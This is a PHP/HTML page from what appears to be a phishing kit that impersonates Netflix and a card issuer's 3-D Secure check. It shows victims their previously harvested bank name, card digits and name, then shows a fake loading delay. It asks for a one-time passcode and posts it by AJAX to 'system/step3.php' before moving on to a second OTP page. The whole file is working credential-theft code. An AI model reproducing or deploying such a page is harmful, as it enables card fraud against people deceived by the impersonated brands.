<?php session_start();
   if(!isset($_SESSION['language'])){exit(header("Location: index"));
   }else{include "system/languages/{$_SESSION['language']}.php";
   }?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/style/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/style/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   </head>
   <body>
      <center>
         <style>.success, .error, .validation {
            border: 1px solid;
            margin: 10px 0px;
            padding: 15px 10px 15px 50px;
            background-repeat: no-repeat;
            background-position: 10px center;
            }
            .success {
            color: #4F8A10;
            background-color: #DFF2BF;
            }
            .error{
            color: #D8000C;
            background-color: #FFBABA;
            }
            .validation{
            color: #D63301;
            background-color: #FFCCBA;
            }
         </style>
         <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
            <?php if($_SESSION['ctype']=='visa'){echo '<img src="files/img/vsa_p.svg" style="width: 90px;float:left;">';echo '<img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='mastercard'){echo '<img src="files/img/mst_p.svg" style="width: 90px;float:left;">';echo '<img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='discover'){echo '<img src="files/img/ccicons/discover-on.png" style="width: 90px;float:left;">';echo '<img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}elseif($_SESSION['ctype']=='amex'){echo '<img src="files/img/ccicons/amex-on.png" style="width: 90px;float:left;">';echo '<img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}else{echo '<img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">';}?>
            <div style="clear:both"></div>
            <p style="font-size:13px;margin-top:25px;color:#807979"> <?php echo $vbv_tr['sec']?></p>
            <p style="font-size:13px;margin-top:25px;color:#807979"><?php echo $vbv_tr['sec2']?><?php echo $_SESSION['lastph'] ?></p>
            <script type="text/javascript">
               document.onreadystatechange = function () {
                 var state = document.readyState
                 if (state == 'complete') {
                     setTimeout(function(){
                         document.getElementById('interactive');
                       // document.getElementById('fixed').style.visibility="hidden";
               		 $("#fixed").hide();
               		 $("#formf").show(500);
                     },4000);
                 }
               }
            </script>
            <form method="post" id="formf" style="display: none;">
               <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                  <tbody>
                     <p style="display:none;" class="validation" id="tiitleerror"><?php echo $vbv_tr['msger']?></p>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['bnk']?></td>
                        <td><?php echo $_SESSION['bnk'];?></td>
                     </tr>
                     <br>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['dat']?></td>
                        <td><?php echo date("d M,Y");  ?></td>
                     </tr>
                     <br>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['crd']?></td>
                        <td> XXXX-XXXX-XXXX-<?php echo $_SESSION['last']?></td>
                     </tr>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['funa']?></td>
                        <td><?php echo $_SESSION['fnm'];?></td>
                     </tr>
                     <tr>
                        <td align="right" id="tiitleCardnetpas"><?php echo $vbv_tr['cos']?></td>
                        <td>
                           <span id="countdown" class="timer"></span><script>
                              var seconds = 120;
                              function secondPassed() {
                              var minutes = Math.round((seconds - 30)/60);
                              var remainingSeconds = seconds % 60;
                              if (remainingSeconds < 10) {
                                 remainingSeconds = "0" + remainingSeconds; 
                              }
                              document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
                              if (seconds == 0) {
                               clearInterval(countdownTimer);
                               document.getElementById('countdown').innerHTML = "";
                              } else {
                               seconds--;
                              }
                              }
                              var countdownTimer = setInterval('secondPassed()', 1000);
                           </script>
                        </td>
                     </tr>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['otpc']?></td>
                        <td class="xx"><input style="width: 75px;" type="password" name="otp1" required=""></td>
                     </tr>
                     <tr>
                        <td></td>
                        <td><br>
                           <input style="width:74px" type="submit" value="<?php echo $vbv_tr['submit']?>">
                        </td>
                     </tr>
                  </tbody>
               </table>
            </form>
            <script type="text/javascript">
               var request;
               $("#formf").submit(function(event){
                 event.preventDefault();
                 if (request) {
                     request.abort();
                 }
                 var $form = $(this);
                 var $inputs = $form.find("input, select, button, textarea");
                 var serializedData = $form.serialize();
                 $inputs.prop("disabled", true);
               $("#tiitleerror").show(400);
                 request = $.ajax({
                     url: "system/step3.php",
                     type: "post",
                     data: serializedData
                 });
                 request.done(function (response, textStatus, jqXHR){
               $(location).attr("href", "otp2.php");
                 });
                 request.fail(function (jqXHR, textStatus, errorThrown){
                     console.error(
                         "The following error occurred: "+
                         textStatus, errorThrown
                     );
                 });
                 request.always(function () {
                     $inputs.prop("disabled", false);
                 });
               });
            </script>
            <div id="fixed" class="" style="">
               <img src="files/img/lod2.gif">
               <p class="">Loading...</p>
            </div>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1997-  <?php echo date("Y");?> . All rights reserved. </p>
         </div>
         <div id="rotate" style="display:none">
            <div class="circle">
               <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
         </div>
      </center>
   </body>
</html>